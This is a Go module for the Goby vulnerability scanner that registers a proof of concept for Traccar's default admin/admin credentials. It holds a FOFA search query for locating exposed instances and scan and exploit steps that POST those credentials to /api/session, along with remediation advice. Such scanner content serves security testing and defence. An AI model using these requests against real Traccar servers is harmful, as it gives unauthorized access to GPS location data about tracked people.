package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Traccar session Api Default Password Vulnerability",
    "Description": "<p>Traccar is an open source GPS tracking system. Traccar has a weak password vulnerability, which can be used by attackers to obtain sensitive information.</p><p/><p>Username admin password admin</p>",
    "Impact": "<p>Traccar Default password</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Traccar",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "Traccar session 接口默认密码漏洞",
            "Product": "Traccar",
            "Description": "<p><code></code><span style=\"font-size: 16px;\"></span>Traccar是一个开源的GPS跟踪系统。 Traccar存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。<span style=\"font-size: 16px;\"></span><span style=\"font-size: 16px;\"></span><br></p><p>用户名admin密码admin</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>Traccar是一个开源的GPS跟踪系统。 Traccar存在弱口令漏洞，攻击者可利用该漏洞获取敏感信息。<br></p><p>用户名admin密码admin</p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Traccar session Api Default Password Vulnerability",
            "Product": "Traccar",
            "Description": "<p>Traccar is an open source GPS tracking system. Traccar has a weak password vulnerability, which can be used by attackers to obtain sensitive information.</p><p><br></p><p>Username admin password admin</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Traccar Default password</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "title=\"Traccar\"",
    "GobyQuery": "title=\"Traccar\"",
    "Author": "xiaodan",
    "Homepage": "https://www.traccar.org/",
    "DisclosureDate": "2022-03-30",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5",
    "CVEIDs": [],
    "CNVD": [
        "CNVD-2021-40750"
    ],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/session",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "email=admin&password=admin&undefined=false"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name\":\"admin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/session",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
                },
                "data_type": "text",
                "data": "email=admin&password=admin&undefined=false"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "name\":\"admin\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6979"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
